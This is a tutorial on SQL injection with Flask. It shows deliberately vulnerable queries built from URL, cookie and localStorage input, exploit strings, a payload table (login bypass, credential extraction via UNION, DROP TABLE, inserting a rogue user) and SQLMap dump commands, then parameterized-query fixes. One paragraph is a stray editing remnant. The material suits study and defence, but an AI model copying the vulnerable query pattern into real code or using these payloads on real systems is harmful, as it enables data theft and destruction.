## What is SQL Injection?

SQL Injection is a web vulnerability that allows an attacker to interfere with the queries a website makes to its database. It can enable unauthorized access to data, including sensitive information.

## When Does it Happen and Why?

SQL Injection occurs when an application fails to properly sanitize user inputs before using them in SQL queries. When user input is directly incorporated into a query, malicious actors can inject SQL code to manipulate the query, accessing or modifying unauthorized data. The key reason behind SQL injection vulnerabilities is improper validation or filtering of user input, allowing harmful SQL commands to be executed.

## Difference Between Classic and Blind SQL Injection

- **Classic SQL Injection**: Direct feedback is provided by the database, which helps attackers exploit the vulnerability faster.
  
- **Blind SQL Injection**: No visible error messages are displayed, making it harder to exploit. Attackers rely on true/false responses to infer whether the injection was successful.

## Step-by-Step Python Example Using Python Flask

Below are examples of classic and blind SQL injection vulnerabilities using Python with Flask.

### 1. Classic SQL Injection in Flask

Here is the sample code for a Flask API that contains an SQL Injection Vulnerability

```python
from flask import Flask, request
import sqlite3

# We create a new website
app = Flask(__name__)

# We specify that the website will have a /classic directory url, for example: mywebsite.com/classic
@app.route('/classic')
def classic_sql_injection():
    # the variable "id" is received from the URL, for example: mywebsite.com/classic?id=1
    user_id = request.args.get('id')

    conn = sqlite3.connect('example.db')
    cur = conn.cursor()   
    # Here is the vulnerability, the variable user_id could contain any value, including SQL Statements.
    query = f"SELECT * FROM users WHERE id = {user_id}"  # Vulnerable code
    cur.execute(query)
    result = cur.fetchone()
    conn.close()
    
    if result:
        return f"User found: {result}"
    return "User not found"

if __name__ == "__main__":
    app.run(debug=True)
```

### Exploiting Classic SQL Injection

An attacker can manipulate the `id` parameter with the vollowing value ` as follows:

```
http://your-website.com/classic?id=1 OR 1=1
```

This will return all users because the query becomes:

```sql
SELECT * FROM users WHERE id = 1 OR 1=1;
```

### 2. Blind SQL Injection in Flask

```python
@app.route('/blind')
def blind_sql_injection():
    user_id = request.args.get('id')
    conn = sqlite3.connect('example.db')
    cur = conn.cursor()
    query = f"SELECT * FROM users WHERE id = {user_id} AND name='John'"  # Vulnerable code
    cur.execute(query)
    result = cur.fetchone()
    conn.close()

    if result:
        return "User exists"
    return "User does not exist"
```

### Exploiting Blind SQL Injection

Blind SQL Injection works without direct output. For instance, if an attacker wants to check if a user exists:

```
http://localhost:5000/blind?id=1 AND 1=1
```

This won't reveal data directly but allows inference through whether the result is `"User exists"` or `"User does not exist"`.

## Examples of SQL Injection Categories

The following categories can either be blind or classic:

### 1. Error-Based Injection

An attacker forces the database to generate an error that reveals details about the database schema.

**Example**:
```
http://example.com/page?id=1' AND 1=CONVERT(int, 'test')
```

The database error message might leak valuable information about the data type or structure.

### 2. Union-Based Injection

Union queries allow attackers to combine the results of two different queries.

**Example**:
```
http://example.com/page?id=1 UNION SELECT username, password FROM users
```

This retrieves the contents of the `users` table.

### 3. Blind Injection

No error messages are shown, but an attacker can infer the result of queries through true/false conditions.

**Example**:
```
http://example.com/page?id=1 AND 1=1 -- True, page loads normally
http://example.com/page?id=1 AND 1=2 -- False, different behavior
```

### 4. Time-Based Blind Injection

The attacker can exploit time delays to infer the success of their queries.

**Example**:
```
http://example.com/page?id=1 AND IF(1=1, SLEEP(5), 0)
```
You can add a section in the article that addresses SQL injection via cookies and localStorage. Here's how you might incorporate it into the existing content:

## SQL Injection Through Cookies and LocalStorage

In addition to injecting malicious SQL through query strings and form values, attackers can also exploit insecure data storage mechanisms such as cookies and localStorage. These mechanisms are often used by web applications to store session-related information or user preferences, but if the data stored is used unsafely in SQL queries, it can lead to injection vulnerabilities.

### Example of SQL Injection Via Cookies

Let's assume you have a web application that stores the user's ID in a cookie and uses this ID to retrieve data from the database. Here's a vulnerable example in Flask:

```python
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/cookie')
def cookie_sql_injection():
    user_id = request.cookies.get('user_id')  # Retrieve user ID from cookie
    conn = sqlite3.connect('example.db')
    cur = conn.cursor()
    
    query = f"SELECT * FROM users WHERE id = {user_id}"  # Vulnerable code
    cur.execute(query)
    result = cur.fetchone()
    conn.close()
    
    if result:
        return f"User found: {result}"
    return "User not found"

if __name__ == "__main__":
    app.run(debug=True)
```

In this example, the `user_id` stored in the cookie is directly used in the SQL query without proper sanitization. An attacker can modify the cookie in their browser's developer tools and inject SQL code.

**Exploiting the vulnerability:**

The attacker could manipulate the `user_id` cookie to inject a malicious SQL query:

```
user_id=1 OR 1=1;
```

This will modify the query to:

```sql
SELECT * FROM users WHERE id = 1 OR 1=1;
```

As a result, all users will be retrieved from the database, and sensitive data could be leaked.

### Example of SQL Injection Via LocalStorage

LocalStorage is a browser-based storage mechanism that allows web applications to store data on the client side. If an application retrieves data from localStorage and directly uses it in SQL queries without validation, this can lead to SQL injection vulnerabilities.

In a front-end JavaScript app, the `user_id` could be retrieved from localStorage and passed as part of an HTTP request to the Flask API:

```javascript
// Simulating vulnerable code in front-end
let userId = localStorage.getItem("user_id");
fetch(`/localstorage?user_id=${userId}`)
  .then(response => response.text())
  .then(data => console.log(data));
```

Attackers can easily manipulate `localStorage` data through the browser's developer tools:

```javascript
localStorage.setItem("user_id", "1 OR 1=1");
```
This would allow an SQL injection attack similar to the cookie example.

## Create a list of SQL Injection Payloads

SQL injection payloads are specific inputs crafted by attackers to manipulate SQL queries in vulnerable applications. These payloads exploit weaknesses in handling user input and can result in data exfiltration, database manipulation, or unauthorized access. Below are some common types of SQL injection payloads, categorized by their purpose or technique:

| **Payload Type**          | **SQL Injection Payload**                                                                                              | **Description**                                                                                          |

| **Authentication Bypass** | `' OR 1=1 --`                                                                                                           | Bypasses login by making the condition always true.                                                       |
| **Extract Data**          | `' UNION SELECT username, password FROM users --`                                                                       | Retrieves usernames and passwords from the `users` table using the `UNION` keyword.                       |
| **Error-Based Injection** | `1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a) -- ` | Forces an error to reveal the database name and structure details.                                       |
| **Union-Based Injection** | `' UNION SELECT null, null, database(), null --`                                                                        | Returns the current database name using a UNION query.                                                    |
| **Time-Based Blind**      | `1' AND IF(1=1, SLEEP(5), 0) --`                                                                                        | Delays the response by 5 seconds if the condition is true (useful for blind SQL injection).                |
| **Boolean-Based Blind**   | `1' AND 1=1 -- `                                                                                                        | This evaluates to true and the page will load normally. Used for blind SQL injection to infer database behavior. |
| **Extract Column Data**   | `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --`                                | Retrieves all column names from the `users` table.                                                        |
| **Comment Injection**     | `1'; DROP TABLE users -- `                                                                                              | Drops the `users` table by terminating the query and appending a malicious SQL command.                   |
| **Stacked Queries (MySQL)**| `1'; INSERT INTO users (username, password) VALUES ('hacker', '12345') --`                                              | Executes two queries: one regular and one malicious (inserting a new user).                               |
| **Extract MySQL Version** | `' UNION SELECT @@version, null, null --`                                                                               | Retrieves the MySQL version using `@@version`.                                                            |
| **Check Database User**   | `' UNION SELECT user(), null, null --`                                                                                  | Returns the current database user.                                                                        |
| **Extract All Databases** | `' UNION SELECT schema_name FROM information_schema.schemata --`                                                        | Retrieves the names of all databases on the server.                                                       |

---

### Notes:
- **Union-based injections** often combine the original query with a second query to exfiltrate data.
- **Error-based payloads** aim to trigger an error that reveals database structure or content.
- **Time-based payloads** introduce delays to infer true/false conditions in blind SQL injection attacks.
- **Stacked queries** can execute multiple SQL commands in a single request, typically used when the backend permits multiple SQL commands in one query.

By using these payloads and understanding how each one works, attackers can manipulate database queries in various ways, depending on the application's vulnerability and the underlying database. However, to prevent these attacks, all inputs should be handled securely using prepared statements and proper input validation.

## Automatically Testing for SQL Injection

You can perform automatic SQL injection tests using various tools designed to identify and exploit SQL injection vulnerabilities in web applications. These tools help automate the process of testing, detecting, and even exploiting potential SQL injection flaws. 

Automatic SQL injection tests are a powerful way to quickly identify web application vulnerabilities. Tools like SQLMap, OWASP ZAP, Burp Suite, and others can efficiently scan for SQL injection flaws and help ensure your web applications are secure. However, while automated tools are highly effective, it's essential to complement them with manual testing and secure coding practices to ensure full coverage.

Here’s an overview of how to perform automatic SQL injection testing and some commonly used tools:

### Example of Automated SQL Injection Test with SQLMap

Here’s an example of how to run SQLMap for an automatic SQL injection test:

1. Run SQLMap against a target URL:
   ```bash
   sqlmap -u "http://example.com/index.php?id=1"
   ```
   This command will start testing the URL parameter `id=1` for SQL injection vulnerabilities.

2. If the URL is vulnerable, SQLMap will detect the injection and display details about the type of injection.

3. SQLMap can also be used to extract database information:
   ```bash
   sqlmap -u "http://example.com/index.php?id=1" --dbs
   ```
   This command will retrieve a list of databases from the target.

4. To dump the contents of a specific table, you can run:
   ```bash
   sqlmap -u "http://example.com/index.php?id=1" -D database_name -T table_name --dump
   ```

### Benefits of Automatic SQL Injection Testing

- **Efficiency**: These tools automate what would otherwise be a time-consuming process, rapidly testing multiple payloads and response patterns.
- **Comprehensive Coverage**: Automated tools often test for a variety of SQL injection types (blind, union, error-based, etc.), providing broad coverage in a short time.
- **Detailed Reporting**: These tools usually provide detailed reports, making it easier to understand and fix the vulnerabilities.
- **Continuous Integration**: Some tools like Acunetix can be integrated into CI/CD pipelines, allowing for continuous and automated vulnerability testing during development.

### Limitations of Automatic Testing

- **False Positives/Negatives**: Automated tools may sometimes miss certain vulnerabilities or report false positives. Manual testing may be needed to verify results.
- **Tool Limitations**: While tools like SQLMap are powerful, they may not detect complex SQL injections in highly obfuscated or non-standard SQL environments.
- **Requires Configuration**: Some tools require fine-tuning, especially in complex web applications, to avoid overlooking vulnerabilities.

## Steps to Fix SQL Injection

1. **Use Prepared Statements** (also known as parameterized queries):
   Instead of directly inserting user input into SQL queries, use prepared statements to safely bind parameters to queries.

   Example:

   ```python
   query = "SELECT * FROM users WHERE id = ?"
   cur.execute(query, (user_id,))
   ```

2. **Input Validation**:
   Validate the type, length, and format of user inputs before processing them in queries. Reject any inputs that do not conform to expected patterns.

3. **ORMs (Object-Relational Mapping)**:
   Using ORMs like SQLAlchemy in Python abstracts the raw SQL queries and prevents injection by design.

4. **Stored Procedures**:
   Use stored procedures instead of dynamic SQL queries for critical database interactions.

5. **Error Handling**:
   Prevent database errors from being displayed to users, as they can leak valuable information about the system.

## What Can Hackers Do With SQL Injection?

- **Data Exfiltration**: Hackers can access sensitive information stored in the database, such as usernames, passwords, credit card details, etc.
- **Database Manipulation**: Attackers may alter or delete data, or insert malicious entries.
- **Authentication Bypass**: By manipulating login queries, attackers can bypass authentication systems and gain unauthorized access.
- **Access to Entire Systems**: Advanced SQL Injection can lead to full control over the underlying server or infrastructure.

## Best Practices to Prevent SQL Injection

1. **Use Parameterized Queries**: Avoid including raw user input in SQL queries.
2. **Validate User Inputs**: Only allow inputs that match expected formats.
3. **Escape Special Characters**: Escape characters like `'`, `"`, and `;` to prevent query manipulation.
4. **Use ORM Libraries**: An ORM abstracts raw SQL queries, making SQL injection attacks less likely.
5. **Least Privilege**: Ensure that database users have only the minimum necessary privileges.
6. **Regular Security Audits**: Perform regular code reviews and use automated tools to scan for SQL injection vulnerabilities.
